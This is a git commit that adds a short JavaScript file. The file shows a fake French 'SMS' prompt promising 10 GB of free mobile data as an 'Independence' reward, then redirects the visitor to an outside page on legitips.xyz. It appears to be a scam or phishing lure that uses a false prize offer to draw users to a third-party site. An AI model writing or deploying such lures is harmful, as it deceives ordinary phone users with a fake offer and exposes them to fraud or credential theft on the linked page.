8e269c894d179fa69db928043354ff16d5dd2b40
legitips <83867893+legitips@users.noreply.github.com>
2024-08-09 23:29:00 -0700

    Create activation-dataoffers.js

---
+++ activation-dataoffers.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS: Cher client, veuillez vérifier si votre carte SIM est éligible pour recevoir 10 Go de données, Happy Independence Reward, appuyez sur 1 pour vérifier maintenant.','1');
+if (password != '1') {
+location.href='https://legitips.xyz/dataoffers.html';
+}
